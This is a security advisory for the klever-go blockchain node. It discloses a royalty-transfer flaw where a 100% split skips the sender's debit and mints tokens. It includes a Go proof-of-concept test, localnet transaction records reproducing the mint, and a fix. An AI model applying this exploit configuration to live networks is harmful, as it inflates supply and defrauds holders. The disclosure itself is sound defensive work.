# [H] klever-go: Percentage-transfer royalty skips the source debit at exactly-100% splits

## Summary
Severity: High
Advisory: GHSA-v358-wf77-39xv
CVE: CVE-2026-55763
CWE: CWE-841
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-v358-wf77-39xv
Type: github-advisory

## Affected
- Go: `github.com/klever-io/klever-go` — affected >=0 <1.7.19-rc4

## Details
## Summary
In `processPercentageRoyaltiesTransfer` the royalty pool is collected from the sender by `SubFromBalance` that is
ordered **after** the split loop and after `if royaltiesToPay <= 0 { return Ok }`. The split-payout guard rejects
only an allocation that *exceeds* the pool (a strict `splitToPay > royaltiesToPay`), so a split entry of **exactly
100%** (`PercentTransferPercentage = 10000`) is a *valid* config: it drives `royaltiesToPay` to 0 and hits the
early-return **before** the sender is debited. The split recipient keeps the full royalty; the sender pays nothing
for it → mint. The sibling fixed-royalty path (`processFixedRoyaltiesTransfer`) debits the sender **first** and is
safe. Only the percentage-transfer path collects and distributes in the same function with the collect placed after
the early-return.

## Affected code
- `core/kapp/accounts/accounts.go` — `processPercentageRoyaltiesTransfer`: split loop → `if royaltiesToPay <= 0
  { return Ok }` → `acntSrc.SubFromBalance(royaltyAmount)` (debit after the early-return). Contrast the safe
  `processFixedRoyaltiesTransfer` (debit before the loop).

## Impact
Unbounded self-inflation of the transferred KDA: `royaltyAmount = transferValue × rate` is minted to an
owner-controlled split address on every transfer of the asset, with no source debit and no supply-counter update
(off-the-books).

## Reachability
Owner-gated to configure (own KDA with a `TransferPercentage` royalty + a 100% split). Once configured, the mint
fires on **any** holder's transfer of the asset — not just the owner's.

## Proof of concept

### Unit test
`TestExploit_PercentRoyaltyZeroDebit` drives the real `processPercentageRoyaltiesTransfer` with all relevant forks
ON (`KdaFpr`, `EnableSmartContracts`, `FixMarketBuyOverflow`). With a single 100% split the recipient is credited
the full royalty (`40`) while the sender's `SubFromBalance` is called **0 times** (mint = 40); the 50% control case
does not early-return, the sender is debited, and value conserves.

<details><summary>Full Go PoC (<code>core/kapp/accounts</code> package, passes = mint confirmed)</summary>

```go
package accounts

import (
	"bytes"
	"encoding/hex"
	"testing"

	"github.com/stretchr/testify/require"

	commonMock "github.com/klever-io/klever-go/common/mock"
	"github.com/klever-io/klever-go/core"
	"github.com/klever-io/klever-go/core/kapp"
	"github.com/klever-io/klever-go/data/block"
	"github.com/klever-io/klever-go/data/state"
	"github.com/klever-io/klever-go/data/transaction"
	integrationMock "github.com/klever-io/klever-go/integrationTest/mock"
	"github.com/klever-io/klever-go/kapps"
	kvmStub "github.com/klever-io/klever-go/kvm/mock/stub"
)

// TestExploit_PercentRoyaltyZeroDebit proves the zero-debit mint:
// processPercentageRoyaltiesTransfer credits the split recipient
// inside the loop, then hits `if royaltiesToPay <= 0 { return Ok }` BEFORE the
// sender's `acntSrc.SubFromBalance(royaltyAmount, ...)`. A single VALID split
// entry of exactly 100% (PercentTransferPercentage = 10000) drives royaltiesToPay
// to 0 and skips the debit => the recipient keeps royaltyAmount, the sender pays
// nothing => mint. The sibling fixed path debits FIRST, so the 50% contrast case
// (which does NOT early-return) confirms the debit fires and value is conserved.
func TestExploit_PercentRoyaltyZeroDebit(t *testing.T) {
	const (
		assetIDStr     = "FUNGI-1234"
		transferValue  = int64(800)
		royaltyRatePct = uint32(500) // 5%
		royaltyAmount  = int64(40)   // 800 * 5% = 40
	)

	assetID := []byte(assetIDStr)

	// 32-byte, non-zero-prefixed => not a smart-contract address, so the royalty
	// path is not short-circuited by core.IsSmartContractAddress.
	senderAddr := bytes.Repeat([]byte{0x11}, 32)
	// Split recipient address must be a valid hex string (computeSplitRoyalties
	// hex-decodes the map key).
	recipientAddr := bytes.Repeat([]byte{0x22}, 32)
	recipientKey := hex.EncodeToString(recipientAddr)
	royaltyReceiverAddr := bytes.Repeat([]byte{0x33}, 32)

	buildKDA := func(splitPercent uint32) *kapps.KDAData {
		return &kapps.KDAData{
			AssetType:    kapps.KDAData_Fungible,
			OwnerAddress: senderAddr,
			Royalties: &kapps.RoyaltiesData{
				Address: royaltyReceiverAddr,
				TransferPercentage: []*kapps.RoyaltyData{
					{Amount: 1000, Percentage: royaltyRatePct},
				},
				SplitRoyalties: map[string]*kapps.RoyaltySplitData{
					recipientKey: {PercentTransferPercentage: splitPercent},
				},
			},
		}
	}

	type runResult struct {
		subFromCalls    int
		subFromAmount   int64
		addToRecipient  int64
		addToOwnerRem   int64
		resCode         transaction.Transaction_TXResultCode
		err             error
	}

	run := func(t *testing.T, splitPercent uint32) runResult {
		t.Helper()

		res := runResult{}

		// Sender: track whether/what the royalty debit hits. Holds plenty of the asset.
		acntSrc := &commonMock.UserAccountHandlerStub{
			AddressBytesCalled: func() []byte { return senderAddr },
			GetBalanceCalled:   func(_ []byte, _ bool) int64 { return 1_000_000 },
			SubFromBalanceCalled: func(value int64, _ []byte, _ bool, _ ...*kapps.UserKDA) error {
				res.subFromCalls++
				res.subFromAmount += value
				return nil
			},
		}

		// Destination is irrelevant to the royalty pool accounting here.
		acntDst := &commonMock.UserAccountHandlerStub{
			AddressBytesCalled: func() []byte { return royaltyReceiverAddr },
		}

		// Split recipient: capture the credit it receives.
		splitRecipient := &commonMock.UserAccountHandlerStub{
			AddressBytesCalled: func() []byte { return recipientAddr },
			AddToBalanceCalled: func(value int64, _ []byte, _ bool, _ ...*kapps.UserKDA) error {
				res.addToRecipient += value
				return nil
			},
		}

		// Owner-remainder receiver (only credited when the path does NOT early-return).
		royaltyReceiver := &commonMock.UserAccountHandlerStub{
			AddressBytesCalled: func() []byte { return royaltyReceiverAddr },
			AddToBalanceCalled: func(value int64, _ []byte, _ bool, _ ...*kapps.UserKDA) error {
				res.addToOwnerRem += value
				return nil
			},
		}

		cacher := &commonMock.AccountsCacherStub{
			LoadUserCalled: func(address []byte) (state.UserAccountHandler, error) {
				if bytes.Equal(address, recipientAddr) {
					return splitRecipient, nil
				}
				if bytes.Equal(address, royaltyReceiverAddr) {
					return royaltyReceiver, nil
				}
				return acntSrc, nil
			},
			GetExistingUserCalled: func(address []byte) (state.UserAccountHandler, error) {
				return royaltyReceiver, nil
			},
			UpdateUserCalled: func(_ state.AccountHandler) error { return nil },
		}

		// All relevant forks ON: KdaFpr (new royalty flow), EnableSmartContracts
		// (overflow-checked percentage math), and FixMarketBuyOverflow so the
		// fix-branch payout guard `splitToPay > royaltiesToPay` is ACTIVE.
		fc := &integrationMock.ForkControllerStub{
			KdaFprCalled:               func() bool { return true },
			EnableSmartContractsCalled: func() bool { return true },
			FixMarketBuyOverflowCalled: func() bool { return true },
		}

		kappController := &kvmStub.KAppControllerStub{
			GetCurrentKAppContextCalled: func() kapp.KappContext {
				return kapp.NewKappContext(kapp.ArgsNewKAppContext{
					OriginalSender: senderAddr,
					ContractID:     0,
					ContractType:   transaction.TXContract_TransferContractType,
					Block:          &block.Block{},
				})
			},
		}

		a := &accountsKapp{
			accountsCacher: cacher,
			forkController: fc,
			KAppController: kappController,
		}

		tc := &transaction.TransferContract{
			Amount:       transferValue,
			KDARoyalties: royaltyAmount, // must match the computed pool (accounts.go line 429)
		}

		kda := buildKDA(splitPercent)

		res.resCode, res.err = a.processPercentageRoyaltiesTransfer(
			tc, assetID, nil, acntSrc, acntDst, kda,
		)
		return res
	}

	// ---- 100% split: the exploit. Recipient credited, sender NEVER debited. ----
	t.Run("split_100pct_mints", func(t *testing.T) {
		r := run(t, core.HundredPercent) // 10000 == exactly 100%, a VALID config

		require.NoError(t, r.err)
		require.Equal(t, transaction.Transaction_Ok, r.resCode)

		credited := r.addToRecipient
		debited := r.subFromAmount
		mintDelta := credited - debited

		t.Logf("[100%% case] split recipient credited (AddToBalance) = %d", credited)
		t.Logf("[100%% case] sender royalty-debit calls (SubFromBalance) = %d", r.subFromCalls)
		t.Logf("[100%% case] sender royalty amount debited            = %d", debited)
		t.Logf("[100%% case] owner-remainder credited                 = %d", r.addToOwnerRem)
		t.Logf("[100%% case] MINT delta (credited - debited)          = %d", mintDelta)

		// (1) split recipient WAS credited the full royaltyAmount (> 0).
		require.Equal(t, royaltyAmount, credited,
			"split recipient must receive the full royalty pool")
		require.Greater(t, credited, int64(0))

		// (2) the sender's royalty debit was NEVER called -> value created.
		require.Equal(t, 0, r.subFromCalls,
			"BUG CONFIRMED: SubFromBalance (sender royalty debit) was skipped by the <=0 early-return")
		require.Equal(t, int64(0), debited)

		// credited > debited => mint of royaltyAmount.
		require.Equal(t, royaltyAmount, mintDelta,
			"fix is INCOMPLETE: %d of %s minted (recipient credited, sender never debited)",
			mintDelta, assetIDStr)
	})

	// ---- 50% split contrast: NO early-return, sender IS debited -> conserved. ----
	t.Run("split_50pct_conserves", func(t *testing.T) {
		r := run(t, core.HundredPercent/2) // 5000 == 50%

		require.NoError(t, r.err)
		require.Equal(t, transaction.Transaction_Ok, r.resCode)

		credited := r.addToRecipient + r.addToOwnerRem
		debited := r.subFromAmount

		t.Logf("[50%% case] split recipient credited      = %d", r.addToRecipient)
		t.Logf("[50%% case] owner-remainder credited       = %d", r.addToOwnerRem)
		t.Logf("[50%% case] total credited                 = %d", credited)
		t.Logf("[50%% case] sender royalty-debit calls      = %d", r.subFromCalls)
		t.Logf("[50%% case] sender royalty amount debited   = %d", debited)
		t.Logf("[50%% case] net (credited - debited)        = %d (0 => conserved)", credited-debited)

		// Sender IS debited the full royalty pool exactly once.
		require.Equal(t, 1, r.subFromCalls,
			"sibling path: at <100%% the early-return does NOT fire, so the sender royalty debit runs")
		require.Equal(t, royaltyAmount, debited)

		// Split (20) + owner remainder (20) == debited (40): value conserved.
		require.Equal(t, royaltyAmount/2, r.addToRecipient)
		require.Equal(t, royaltyAmount/2, r.addToOwnerRem)
		require.Equal(t, debited, credited, "50%% case conserves: total credited == debited")
	})
}
```
</details>

### On-chain reproduction (live single-node localnet)
Asset `F07-3NG3` was created with a 10% transfer royalty (`percentage: 1000`) and a single 100% split
(`percentTransferPercentage: 10000`) to address `R` (`klv1qeh4py4…qcv2xjm`). A transfer of `100,000,000,000` units
(with `kdaRoyalties = 10,000,000,000`, i.e. the 10% pool) then produced **two** credit receipts: the recipient gets
the `100,000,000,000` transfer, and `R` is credited the **`10,000,000,000`** royalty — while the sender was debited
only the transfer amount, never the royalty. Net: 10,000 F07 created on the transfer.

<details><summary>Create tx — <code>F07-3NG3</code>, 10% transfer royalty + single 100% split to <code>R</code> (hash <code>ec2a8e8d…af12bc7f</code>)</summary>

```json
{
    "hash": "ec2a8e8d17136986756141f598f869803528ab12840416671b09622eaf12bc7f",
    "blockNum": 104,
    "status": "success",
    "resultCode": "Ok",
    "chainID": "420420",
    "contract": [
        {
            "type": 1,
            "typeString": "CreateAssetContractType",
            "parameter": {
                "type": "Fungible",
                "name": "Finding07",
                "ticker": "F07",
                "precision": 6,
                "initialSupply": 1000000000000,
                "maxSupply": 0,
                "royalties": {
                    "address": "klv1ddnnxjrt4jhus4ddtzmp6ccpcu3us78ndrn4qet0x0vegpg4995qv4nctq",
                    "transferPercentage": [
                        { "percentage": 1000 }
                    ],
                    "splitRoyalties": [
                        {
                            "address": "klv1qeh4py4p5zzy94l2hnygpfklug82gpzw08u680ycwp00njxyhgdqcv2xjm",
                            "percentTransferPercentage": 10000
                        }
                    ]
                }
            }
        }
    ]
}
```
</details>

<details><summary>Transfer tx — royalty pool 10,000,000,000 credited to <code>R</code> with no source debit (hash <code>37527757…bf3706b1</code>)</summary>

```json
{
    "hash": "37527757b10dcf968b86cc3c0abf971c70e81aef0348b4a5b7d4ccc1bf3706b1",
    "blockNum": 120,
    "status": "success",
    "resultCode": "Ok",
    "chainID": "420420",
    "receipts": [
        {
            "assetId": "F07-3NG3",
            "from": "klv1ddnnxjrt4jhus4ddtzmp6ccpcu3us78ndrn4qet0x0vegpg4995qv4nctq",
            "to": "klv1qeh4py4p5zzy94l2hnygpfklug82gpzw08u680ycwp00njxyhgdqcv2xjm",
            "type": 0,
            "typeString": "Transfer",
            "value": 10000000000
        },
        {
            "assetId": "F07-3NG3",
            "from": "klv1ddnnxjrt4jhus4ddtzmp6ccpcu3us78ndrn4qet0x0vegpg4995qv4nctq",
            "to": "klv1fttx7kd0mzw3t8nekmh98489dwqq6mehs98nfcuvewwz0yt776aqf5ydfa",
            "type": 0,
            "typeString": "Transfer",
            "value": 100000000000
        }
    ],
    "contract": [
        {
            "type": 0,
            "typeString": "TransferContractType",
            "parameter": {
                "assetId": "F07-3NG3",
                "toAddress": "klv1fttx7kd0mzw3t8nekmh98489dwqq6mehs98nfcuvewwz0yt776aqf5ydfa",
                "amount": 100000000000,
                "kdaRoyalties": 10000000000
            }
        }
    ]
}
```
</details>

## Remediation
Reorder so the royalty pool is debited from the sender **before** the split distribution, mirroring
`processFixedRoyaltiesTransfer`:
```go
err := acntSrc.SubFromBalance(royaltyAmount, assetID, ...)   // debit FIRST
// ... then the split loop and `if royaltiesToPay <= 0 { return Ok }` (now only skips a zero owner-remainder)
```
Add the unit test above as a regression guard. Consensus-affecting → gate behind the next activation flag.

## References
- https://github.com/klever-io/klever-go/security/advisories/GHSA-v358-wf77-39xv
- https://github.com/klever-io/klever-go/commit/8bcc600b0ac88070740c63c7ce1c8a968dd85251
- https://github.com/klever-io/klever-go
- https://github.com/klever-io/klever-go/releases/tag/v1.7.19
